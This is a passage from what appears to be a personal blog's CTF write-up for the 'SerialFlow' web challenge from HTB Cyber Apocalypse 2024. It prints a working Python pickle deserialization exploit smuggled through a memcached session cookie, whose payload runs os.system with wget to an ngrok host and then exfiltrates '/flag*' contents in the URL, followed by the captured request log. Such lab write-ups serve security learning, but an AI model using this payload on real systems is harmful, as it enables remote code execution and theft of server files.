<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> pickle</span></div><div class='line'><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> os</span></div><div class='line'></div><div class='line'><span style="color: #C792EA">class</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">RCE</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">__reduce__</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">self</span><span style="color: #89DDFF">):</span></div><div class='line'><span style="color: #EEFFFF">        cmd </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">wget https://b058-2407-d000-403-e00e-60d2-910d-df7c-df4d.ngrok-free.app</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,)</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> os</span><span style="color: #89DDFF">.</span><span style="color: #F07178">system</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">cmd</span><span style="color: #89DDFF">,)</span></div><div class='line'></div><div class='line'><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">generate_exploit</span><span style="color: #89DDFF">():</span></div><div class='line'><span style="color: #EEFFFF">    payload </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> pickle</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">dumps</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">RCE</span><span style="color: #89DDFF">(),</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">0</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">    payload_size </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">len</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">payload</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">    cookie </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">b</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">137</span><span style="color: #EEFFFF">&#92;r&#92;n</span><span style="color: #C3E88D">set BT_:1337 0 2592000 </span><span style="color: #89DDFF">'</span></div><div class='line'><span style="color: #EEFFFF">    cookie </span><span style="color: #89DDFF">+=</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">str</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">encode</span><span style="color: #89DDFF">(</span><span style="color: #FFCB6B">str</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">payload_size</span><span style="color: #89DDFF">))</span></div><div class='line'><span style="color: #EEFFFF">    cookie </span><span style="color: #89DDFF">+=</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">str</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">encode</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF">&#92;r&#92;n</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">    cookie </span><span style="color: #89DDFF">+=</span><span style="color: #EEFFFF"> payload</span></div><div class='line'><span style="color: #EEFFFF">    cookie </span><span style="color: #89DDFF">+=</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">str</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">encode</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF">&#92;r&#92;n</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">    cookie </span><span style="color: #89DDFF">+=</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">str</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">encode</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">get BT_:1337</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">)</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    pack </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">''</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">for</span><span style="color: #EEFFFF"> x </span><span style="color: #89DDFF">in</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">list</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">cookie</span><span style="color: #89DDFF">):</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> x </span><span style="color: #89DDFF">&gt;</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">64</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">            pack </span><span style="color: #89DDFF">+=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">oct</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">x</span><span style="color: #89DDFF">).</span><span style="color: #82AAFF">replace</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">0o</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF">\</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">elif</span><span style="color: #EEFFFF"> x </span><span style="color: #89DDFF">&lt;</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">8</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">            pack </span><span style="color: #89DDFF">+=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">oct</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">x</span><span style="color: #89DDFF">).</span><span style="color: #82AAFF">replace</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">0o</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF">\</span><span style="color: #C3E88D">00</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">else</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">            pack </span><span style="color: #89DDFF">+=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">oct</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">x</span><span style="color: #89DDFF">).</span><span style="color: #82AAFF">replace</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">0o</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF">\</span><span style="color: #C3E88D">0</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">)</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">f</span><span style="color: #C3E88D">"</span><span style="color: #EEFFFF">"&#123;pack&#125;"</span><span style="color: #C3E88D">"</span></div><div class='line'></div><div class='line'><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> __name__ </span><span style="color: #89DDFF">==</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">__main__</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">generate_exploit</span><span style="color: #89DDFF">())</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>The payload i got looked something like this:
<img src="https://github.com/hash3liZer/khatta/assets/29171692/b55a7d35-80e4-47d0-9283-1d92ec0b0a08" alt="image" class="rounded-lg my-2" loading="lazy" decoding="async"></p>
<p>As per the HTTP specs, we need send it with double quotes as the session cookie. I used burp:
<img src="https://github.com/hash3liZer/khatta/assets/29171692/030407bb-f81b-42a0-86dc-f260917a6d92" alt="image" class="rounded-lg my-2" loading="lazy" decoding="async"></p>
<p>At first it returned me a <code>200</code> response. While i should have gotten an <code>Internal Server Error</code>. Running it a couple times, returned me a request on my <code>ngrok</code> terminal:
<img src="https://github.com/hash3liZer/khatta/assets/29171692/5df209cf-3e5f-4a0a-ae0b-45bc7657993c" alt="image" class="rounded-lg my-2" loading="lazy" decoding="async"></p>
<p>So, i modified the exploit a bit to get the flag: </p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'><span style="color: #C792EA">class</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">RCE</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">__reduce__</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">self</span><span style="color: #89DDFF">):</span></div><div class='line'><span style="color: #EEFFFF">        cmd </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">wget "https://b058-2407-d000-403-e00e-60d2-910d-df7c-df4d.ngrok-free.app$(cat /flag*)"</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,)</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> os</span><span style="color: #89DDFF">.</span><span style="color: #F07178">system</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">cmd</span><span style="color: #89DDFF">,)</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>I sent the request second and got the response on terminal: </p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined"># python -m http.server 8080</span></div><div class='line'><span style="color: undefined">Serving HTTP on :: port 8080 (http://[::]:8080/) ...</span></div><div class='line'><span style="color: undefined">::1 - - [12/Mar/2024 22:06:38] code 404, message File not found</span></div><div class='line'><span style="color: undefined">::1 - - [12/Mar/2024 22:06:38] "GET /somethingHTB%7By0u_th0ught_th15_wou1d_b3_s1mpl3?&#125; HTTP/1.1" 404 -</span></div></code></div></pre><!-- HTML_TAG_END -->
<h2 id="ending-note"><a href="#ending-note">Ending Note</a></h2>
<p>Overall, it was really fun playing the CTF and just like any other time, i got new things to learn :)</p></main>
    <div class="divider mt-4 mb-0"></div>
      <div><a href="/?tags=ctf" class="btn btn-sm btn-ghost normal-case mt-2 mr-2 p-category">#ctf
          </a><a href="/?tags=cyber-apocalypse" class="btn btn-sm btn-ghost normal-case mt-2 mr-2 p-category">#cyber-apocalypse
          </a><a href="/?tags=htb" class="btn btn-sm btn-ghost normal-case mt-2 mr-2 p-category">#htb
          </a><a href="/?tags=htb-2024" class="btn btn-sm btn-ghost normal-case mt-2 mr-2 p-category">#htb-2024
          </a><a href="/?tags=web" class="btn btn-sm btn-ghost normal-case mt-2 mr-2 p-category">#web
          </a></div></div>
  
    </article>
    <footer id="footer" class="footer footer-center bg-base-300 text-base-content shadow-inner p-8 md:rounded-box sticky bottom-0 z-0 md:static "><div class="prose"><p><a href="/atom.xml" rel="noopener noreferrer external" target="_blank">Feed</a>
          
        <br>
      Copyright © 2023 - 2024
      @hash3liZer
      <br>
      Powered by
      <a rel="noopener noreferrer external" target="_blank" class="tooltip tooltip-secondary hover:text-secondary" data-tip="🌸 [δ] - Based on MDsveX & SvelteKit 🌸" href="https://github.com/importantimport/urara">Urara
      </a>
      <br>
        <!-- HTML_TAG_START -->Hosted at <a href="https://github.com/hash3liZer/khatta">Khatta</a><!-- HTML_TAG_END --></p></div></footer></div></div></div>


			<script type="application/json" data-sveltekit-fetched data-url="/posts.json">{"status":200,"statusText":"","headers":{},"body":"[{\"title\":\"CTF web challenge writeups for Ignite Islamabad 24 regional round\",\"tags\":[\"ignite-24\",\"web\",\"ctf\",\"regional\"],\"categories\":[\"CTF\",\"Writeups\"],\"summary\":\"Writeups for all web related challenges from Ignite 2024 regional round of Islamabad\",\"created\":\"2024-11-26T00:00:00.000Z\",\"lastmod\":\"2024-11-26T00:00:00.000Z\",\"image\":\"https://github.com/user-attachments/assets/505ce24b-a239-465b-b2cd-ea90a6f43bbd\",\"flags\":[],\"updated\":\"2024-12-26T18:06:47.668Z\",\"slug\":\"/blog/2024/ctf-ignite-islamabad-regional-24-web-writeups/+page.md\",\"path\":\"/blog/2024/ctf-ignite-islamabad-regional-24-web-writeups\",\"toc\":[{\"depth\":2,\"title\":\"readme | Easy\",\"slug\":\"readme--easy\"},{\"depth\":2,\"title\":\"SMG | Medium\",\"slug\":\"smg--medium\"},{\"depth\":2,\"title\":\"wtwaf | Hard\",\"slug\":\"wtwaf--hard\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"Setup Fake (Rogue) Access Point WiFi using HostAPD\",\"tags\":null,\"categories\":[\"wireless\",\"rogue-ap\"],\"summary\":\"A detailed guide on how to setup a rogue or fake access point wifi network using hostapdo\",\"created\":\"2024-08-25T00:00:00.000Z\",\"lastmod\":\"2023-08-25T00:00:00.000Z\",\"image\":\"https://github.com/user-attachments/assets/471e01a7-df63-414e-9370-6b8deafe6686\",\"flags\":[],\"updated\":\"2024-12-26T18:06:47.667Z\",\"slug\":\"/blog/2023/setup-fake-rogue-access-point-hostapd/+page.md\",\"path\":\"/blog/2023/setup-fake-rogue-access-point-hostapd\",\"toc\":[{\"depth\":2,\"title\":\"Technical Terms\",\"slug\":\"technical-terms\"},{\"depth\":3,\"title\":\"Phishing\",\"slug\":\"phishing\"},{\"depth\":3,\"title\":\"Wireless Adapter\",\"slug\":\"wireless-adapter\"},{\"depth\":3,\"title\":\"Is it Effective?\",\"slug\":\"is-it-effective\"},{\"depth\":2,\"title\":\"The Guide\",\"slug\":\"the-guide\"},{\"depth\":3,\"title\":\"Setup Environment\",\"slug\":\"setup-environment\"},{\"depth\":3,\"title\":\"Wireless Interface\",\"slug\":\"wireless-interface\"},{\"depth\":3,\"title\":\"Fake / Rogue Access Point\",\"slug\":\"fake--rogue-access-point\"},{\"depth\":3,\"title\":\"Multiple Access Points (Optional)\",\"slug\":\"multiple-access-points-optional\"},{\"depth\":3,\"title\":\"DHCP\",\"slug\":\"dhcp\"},{\"depth\":3,\"title\":\"Traffic Forwarding\",\"slug\":\"traffic-forwarding\"},{\"depth\":3,\"title\":\"MySQL Storage\",\"slug\":\"mysql-storage\"},{\"depth\":3,\"title\":\"Phishing Site\",\"slug\":\"phishing-site\"},{\"depth\":3,\"title\":\"Apache and MySQL\",\"slug\":\"apache-and-mysql\"},{\"depth\":3,\"title\":\"Deauthentication\",\"slug\":\"deauthentication\"},{\"depth\":3,\"title\":\"Credentials\",\"slug\":\"credentials\"},{\"depth\":2,\"title\":\"Conclusion\",\"slug\":\"conclusion\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"WPA(2) PMKID Hash Cracking (MIC) Process Explained\",\"tags\":[\"wireless\",\"wpa-wpa2\",\"wifi\"],\"categories\":[\"Writeups\"],\"summary\":\"A guide on what the MIC is and how the actual WPA(2) cracking happens at lower level\",\"created\":\"2024-08-25T00:00:00.000Z\",\"lastmod\":\"2024-08-25T00:00:00.000Z\",\"image\":\"https://github.com/user-attachments/assets/51b06557-0a25-4ddd-a59d-6783add3a447\",\"flags\":[],\"updated\":\"2024-12-26T18:06:47.668Z\",\"slug\":\"/blog/2023/wpa-hash-cracking-process-explained-in-detal/+page.md\",\"path\":\"/blog/2023/wpa-hash-cracking-process-explained-in-detal\",\"toc\":[{\"depth\":2,\"title\":\"The Handshake Process\",\"slug\":\"the-handshake-process\"},{\"depth\":3,\"title\":\"(PML) Pairwise Master Key Computation\",\"slug\":\"pml-pairwise-master-key-computation\"},{\"depth\":3,\"title\":\"(PTK) Pairwise Transient Key Computation\",\"slug\":\"ptk-pairwise-transient-key-computation\"},{\"depth\":3,\"title\":\"(MIC) Message Integrity Code\",\"slug\":\"mic-message-integrity-code\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"Writeups for Web challenges from HTB Cyber Apocalypse CTF 2024\",\"tags\":[\"ctf\",\"cyber-apocalypse\",\"htb\",\"htb-2024\",\"web\"],\"categories\":[\"CTF\",\"Writeups\"],\"summary\":\"This blog post contains the writeups for the web challenges that i solved from HTB Cyber Apocalypse 2024\",\"created\":\"2024-03-14T00:00:00.000Z\",\"lastmod\":\"2024-03-14T00:00:00.000Z\",\"image\":\"https://github.com/hash3liZer/khatta/assets/29171692/d5abad92-0b61-4418-af4b-582a6d03044b\",\"flags\":[],\"updated\":\"2024-12-26T18:06:47.667Z\",\"slug\":\"/blog/2023/htb-cyber-apocalypse-ctf-2024-web-writeups/+page.md\",\"path\":\"/blog/2023/htb-cyber-apocalypse-ctf-2024-web-writeups\",\"toc\":[{\"depth\":2,\"title\":\"WEB\",\"slug\":\"web\"},{\"depth\":3,\"title\":\"Labyrinth Linguist - Easy\",\"slug\":\"labyrinth-linguist---easy\"},{\"depth\":3,\"title\":\"LockTalk\",\"slug\":\"locktalk\"},{\"depth\":3,\"title\":\"SerialFlow\",\"slug\":\"serialflow\"},{\"depth\":2,\"title\":\"Ending Note\",\"slug\":\"ending-note\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"Writeups for Web challenges from PCC 23\",\"tags\":[\"pcc23\"],\"categories\":[\"CTF\",\"Writeups\"],\"summary\":\"These are the writeups for web challenges from PCC 23 held at Air University Islamabad\",\"created\":\"2023-12-22T00:00:00.000Z\",\"lastmod\":\"2023-12-22T00:00:00.000Z\",\"image\":\"https://github.com/hash3liZer/khatta/assets/29171692/661f1693-25ee-4ea3-8599-635e7b73cb6e\",\"flags\":[],\"updated\":\"2024-12-26T18:06:47.667Z\",\"slug\":\"/blog/2023/pcc-23-web-challenge-writeups/+page.md\",\"path\":\"/blog/2023/pcc-23-web-challenge-writeups\",\"toc\":[{\"depth\":1,\"title\":\"Qualifiers\",\"slug\":\"qualifiers\"},{\"depth\":3,\"title\":\"Secure ME\",\"slug\":\"secure-me\"},{\"depth\":1,\"title\":\"Finals\",\"slug\":\"finals\"},{\"depth\":3,\"title\":\"JazzME\",\"slug\":\"jazzme\"},{\"depth\":3,\"title\":\"Lama\",\"slug\":\"lama\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"Blackhat MEA CTF Qualifiers Web Authy and Warm Me Up Writeup\",\"tags\":[\"blackhatmea\",\"ctf\",\"authy\",\"warmme-up\",\"unicode\",\"broken-logic\"],\"categories\":[\"CTF\",\"Writeups\"],\"summary\":\"Writeups for 2 of web challenges from Blackhat MEA Qualifier CTF Round namely Authy and Warm Me Up\",\"created\":\"2023-11-13T00:00:00.000Z\",\"lastmod\":\"2023-11-13T00:00:00.000Z\",\"flags\":[],\"updated\":\"2024-12-26T18:06:47.666Z\",\"slug\":\"/blog/2023/blackhatmea-ctf-web-authy-writeup/+page.md\",\"path\":\"/blog/2023/blackhatmea-ctf-web-authy-writeup\",\"toc\":[{\"depth\":2,\"title\":\"Introduction\",\"slug\":\"introduction\"},{\"depth\":3,\"title\":\"Authy\",\"slug\":\"authy\"},{\"depth\":3,\"title\":\"Warm Me Up\",\"slug\":\"warm-me-up\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"Deploy a Django Application on Ubuntu 22.04 with Gunicorn & NGINX\",\"tags\":[\"django\",\"deployment\",\"development\",\"drf\",\"python\",\"ubuntu\"],\"categories\":[\"Linux\",\"Development\"],\"summary\":\"A Detailed walkthrough of the process of deploying a django application on a ubuntu server from scratch. This guide covers the deployment stages with Gunicorn, NGINX and Postgresql.\",\"created\":\"2023-09-11T00:00:00.000Z\",\"lastmod\":\"2023-10-29T00:00:00.000Z\",\"image\":\"https://github.com/hash3liZer/khatta/assets/29171692/ed7dd92d-f7d1-4646-9194-e02102945392\",\"flags\":[],\"updated\":\"2024-12-26T18:06:47.667Z\",\"slug\":\"/blog/2023/deploy-django-website-nginx-gunicorn-ubuntu-22/+page.md\",\"path\":\"/blog/2023/deploy-django-website-nginx-gunicorn-ubuntu-22\",\"toc\":[{\"depth\":2,\"title\":\"Introduction\",\"slug\":\"introduction\"},{\"depth\":2,\"title\":\"Tutorial\",\"slug\":\"tutorial\"},{\"depth\":3,\"title\":\"Pre-Reqs\",\"slug\":\"pre-reqs\"},{\"depth\":3,\"title\":\"Installing Packages\",\"slug\":\"installing-packages\"},{\"depth\":3,\"title\":\"Setting up Project Directory\",\"slug\":\"setting-up-project-directory\"},{\"depth\":3,\"title\":\"Setting up Postgres (Database)\",\"slug\":\"setting-up-postgres-database\"},{\"depth\":3,\"title\":\"Project Settings\",\"slug\":\"project-settings\"},{\"depth\":3,\"title\":\"Spin up the Project\",\"slug\":\"spin-up-the-project\"},{\"depth\":3,\"title\":\"Setting up Gunicorn\",\"slug\":\"setting-up-gunicorn\"},{\"depth\":3,\"title\":\"Setting UP NGINX\",\"slug\":\"setting-up-nginx\"},{\"depth\":2,\"title\":\"Conclusion\",\"slug\":\"conclusion\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"Web Sanity Writeup AmateursCTF 2023 DOM Clobbering and Prototype Pollution\",\"tags\":[\"amateurs-ctf\",\"writeup\",\"sanity\",\"xss\",\"dom-clobbering\",\"prototype-pollution\"],\"categories\":[\"CTF\",\"Writeups\"],\"summary\":\"A complete writeup of sanity web challenge from AmateursCTF 2023. It covers the use of the Sanitizer API in browsers, DOM Clobbering, Parameter Pollution and XSS.\",\"created\":\"2023-07-21T00:00:00.000Z\",\"lastmod\":\"2023-07-21T00:00:00.000Z\",\"image\":\"https://github.com/hash3liZer/khatta/assets/29171692/c70a5dc7-5294-45b7-8a9f-8a04ac9214b3\",\"flags\":[],\"updated\":\"2024-12-26T18:06:47.666Z\",\"slug\":\"/blog/2023/amateursctf-web-2023-writeup-sanity/+page.md\",\"path\":\"/blog/2023/amateursctf-web-2023-writeup-sanity\",\"toc\":[{\"depth\":2,\"title\":\"Introduction\",\"slug\":\"introduction\"},{\"depth\":2,\"title\":\"Surface\",\"slug\":\"surface\"},{\"depth\":2,\"title\":\"Behind the Scenes\",\"slug\":\"behind-the-scenes\"},{\"depth\":3,\"title\":\"DOM Clobbering\",\"slug\":\"dom-clobbering\"},{\"depth\":3,\"title\":\"Attacker Server\",\"slug\":\"attacker-server\"},{\"depth\":3,\"title\":\"Prototype Pollution\",\"slug\":\"prototype-pollution\"},{\"depth\":4,\"title\":\"Proof of Concept (POC)\",\"slug\":\"proof-of-concept-poc\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"A Guide to Zone Transfer, DNS Zone Takeover and Subdomain Takeover\",\"tags\":[\"dns-zone-takeover\",\"dns-zone-transfer\",\"subdomain-takeover\",\"bugbounty\",\"infosec\",\"reconnaissance\",\"automated-tool\"],\"categories\":[\"Bug Bounty\",\"Projects\"],\"summary\":\"In this guide, we will be looking over vulnerabilites associated with a domain normally occured due to the negligence from the develper team. The terms we will see are Zone Transfer, DNS Zone Takeover and Subdomain Takeover.\",\"created\":\"2023-06-30T00:00:00.000Z\",\"lastmod\":\"2023-06-30T00:00:00.000Z\",\"image\":\"https://github.com/hash3liZer/khatta/assets/29171692/755e47ec-8f67-45e9-a7cb-04efe7584127\",\"flags\":[],\"updated\":\"2024-12-26T18:06:47.667Z\",\"slug\":\"/blog/2023/subrake-a-dns-automated-scanner/+page.md\",\"path\":\"/blog/2023/subrake-a-dns-automated-scanner\",\"toc\":[{\"depth\":2,\"title\":\"Introduction\",\"slug\":\"introduction\"},{\"depth\":2,\"title\":\"Subrake\",\"slug\":\"subrake\"},{\"depth\":2,\"title\":\"Explanation\",\"slug\":\"explanation\"},{\"depth\":3,\"title\":\"Zone Transfer\",\"slug\":\"zone-transfer\"},{\"depth\":3,\"title\":\"Subdomain Takeover\",\"slug\":\"subdomain-takeover\"},{\"depth\":3,\"title\":\"DNS Zone Takeover\",\"slug\":\"dns-zone-takeover\"},{\"depth\":4,\"title\":\"Finding Zone Takeover\",\"slug\":\"finding-zone-takeover\"},{\"depth\":2,\"title\":\"Using Subrake\",\"slug\":\"using-subrake\"},{\"depth\":2,\"title\":\"Conclusion\",\"slug\":\"conclusion\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"BSidesTLV CTF 2023 Browselicious (Misc) Writeup\",\"tags\":[\"ctf\",\"writeups\",\"bsidestlv-ctf-2023\"],\"categories\":[\"CTF Writeups\"],\"summary\":\"Writeup for Browselicious challenge (Misc) from BsidesTLV CTF 2023\",\"created\":\"2023-06-28T00:00:00.000Z\",\"lastmod\":\"2023-06-28T00:00:00.000Z\",\"image\":\"https://github.com/hash3liZer/khatta/assets/29171692/1788ec87-fc59-49a7-a035-ec767504fb3d\",\"flags\":[],\"updated\":\"2024-12-26T18:06:47.668Z\",\"slug\":\"/blog/2023/writeup-browselicious-challenge-bsidestlv-ctf/+page.md\",\"path\":\"/blog/2023/writeup-browselicious-challenge-bsidestlv-ctf\",\"toc\":[{\"depth\":1,\"title\":\"Introducton\",\"slug\":\"introducton\"},{\"depth\":1,\"title\":\"Writeup\",\"slug\":\"writeup\"},{\"depth\":3,\"title\":\"Server Request\",\"slug\":\"server-request\"},{\"depth\":3,\"title\":\"Code Review\",\"slug\":\"code-review\"},{\"depth\":3,\"title\":\"Exploit\",\"slug\":\"exploit\"},{\"depth\":4,\"title\":\"Input Field\",\"slug\":\"input-field\"},{\"depth\":4,\"title\":\"Race Condition\",\"slug\":\"race-condition\"},{\"depth\":4,\"title\":\"Post Message\",\"slug\":\"post-message\"},{\"depth\":2,\"title\":\"PoC\",\"slug\":\"poc\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"Google CTF 2023 Under Construction (Web) Writeup\",\"tags\":[\"ctf\",\"writeups\",\"google-ctf-2023\"],\"categories\":[\"CTF Writeups\"],\"summary\":\"Writeup for under construction challenge from google ctf 2023\",\"created\":\"2023-06-27T00:00:00.000Z\",\"lastmod\":\"2023-06-27T00:00:00.000Z\",\"image\":\"https://github.com/hash3liZer/khatta.sh/assets/29171692/f553635d-6deb-43e5-a2ae-0d8cef296db7\",\"flags\":[],\"updated\":\"2024-12-26T18:06:47.668Z\",\"slug\":\"/blog/2023/writeup-under-construction-google-ctf-2023/+page.md\",\"path\":\"/blog/2023/writeup-under-construction-google-ctf-2023\",\"toc\":[{\"depth\":1,\"title\":\"Introduction\",\"slug\":\"introduction\"},{\"depth\":1,\"title\":\"Writeup\",\"slug\":\"writeup\"},{\"depth\":2,\"title\":\"Getting Started\",\"slug\":\"getting-started\"},{\"depth\":2,\"title\":\"Vulnerable Part\",\"slug\":\"vulnerable-part\"},{\"depth\":2,\"title\":\"Exploit\",\"slug\":\"exploit\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"Privacy Policy\",\"created\":\"2023-06-27T00:00:00.000Z\",\"flags\":[\"unlisted\"],\"updated\":\"2024-12-26T18:06:47.668Z\",\"slug\":\"/privacy/+page.svelte.md\",\"path\":\"/privacy\",\"toc\":false,\"type\":\"article\",\"html\":\"\"},{\"title\":\"SSTI Bypass using HTTP Request Referer and Cookie headers - My First App Writeup\",\"tags\":[\"UoftCTF\",\"writeup\",\"ssti\",\"template-injection\",\"jwt\"],\"categories\":[\"CTF\",\"Writeups\"],\"summary\":\"This is solution for My First App challenge from UofTCTF 23. It covers initial JWT cracking and then escalating it to SSTI. And then bypassing filters by using the request object attributes\",\"created\":\"2023-01-16T00:00:00.000Z\",\"lastmod\":\"2023-01-16T00:00:00.000Z\",\"image\":\"https://github.com/hash3liZer/khatta/assets/29171692/45d79cff-0f11-4c49-92cb-a530ee2c36a5\",\"flags\":[\"unlisted\"],\"updated\":\"2024-12-26T18:06:47.667Z\",\"slug\":\"/blog/2023/ssti-bypass-using-referer-and-cookie-my-first-app-uoftctf-23/+page.md\",\"path\":\"/blog/2023/ssti-bypass-using-referer-and-cookie-my-first-app-uoftctf-23\",\"toc\":[{\"depth\":2,\"title\":\"Introduction\",\"slug\":\"introduction\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"About Me\",\"created\":\"2022-05-06T00:00:00.000Z\",\"flags\":[\"unlisted\"],\"updated\":\"2024-12-26T18:06:47.669Z\",\"slug\":\"/resume/+page.svelte.md\",\"path\":\"/resume\",\"toc\":[{\"depth\":2,\"title\":\"Skills\",\"slug\":\"skills\"},{\"depth\":2,\"title\":\"Experience\",\"slug\":\"experience\"},{\"depth\":2,\"title\":\"Education\",\"slug\":\"education\"},{\"depth\":2,\"title\":\"Certifications\",\"slug\":\"certifications\"},{\"depth\":2,\"title\":\"Acheivements\",\"slug\":\"acheivements\"},{\"depth\":2,\"title\":\"Projects\",\"slug\":\"projects\"},{\"depth\":2,\"title\":\"Volunteering and Startups\",\"slug\":\"volunteering-and-startups\"},{\"depth\":2,\"title\":\"Contact\",\"slug\":\"contact\"}],\"type\":\"article\",\"html\":\"\"}]"}</script>
			<script>
				{
					__sveltekit_32tnjn = {
						base: new URL("../../..", location).pathname.slice(0, -1),
						env: {}
					};

					const element = document.currentScript.parentElement;

					const data = [null,null];

					Promise.all([
						import("../../../_app/immutable/entry/start.ce49cd66.js"),
